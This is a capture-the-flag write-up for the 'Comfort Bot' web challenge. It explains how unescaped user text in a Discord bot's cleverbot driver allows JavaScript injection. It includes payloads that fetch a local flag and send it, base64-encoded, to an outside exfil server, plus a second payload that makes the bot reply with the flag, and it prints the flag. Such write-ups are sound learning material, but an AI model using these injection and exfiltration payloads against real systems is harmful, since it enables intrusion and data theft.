# Comfort Bot (Web 432, 39 solves)

We're given the source code of a Discord bot. The code is decently big, but since the the description says `Note: flag is at localhost/flag` we know we're looking for something that results in SSRF (opening of a connection based on user input or RCE in general).
The first instance I ran across was `responseEngines/cleverbot/driver.py`. The getCleverResponse inserts the `txt` argument unescaped into javascript to be run.

We first need to see how to trigger this code. Looking at bot.py, if we prefix our message with `!` it's called indirectly (though driver.py, which just verifies author ID != 0) on whatever input we want! We just need to write javascript that fetches the flag and sends it to our server.

```
!test');
fetch("http://localhost/flag").then(r=>r.text()).then(r=>fetch("https://seraphin.xyz/exfil?" + btoa(r)));
cleverbot.sendAI('
```

That sends an HTTP request with the flag as a base64-encoded query parameter to us.

After, I was curious if I could get the bot to reply with the flag... looks like yes :)
```
comf test');
fetch("http://localhost/flag").then(r=>r.text()).then(r=>window.cleverbot={"aistate":0,"reply":r});
console.log('
```

Flag: ``X-MAS{0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae}``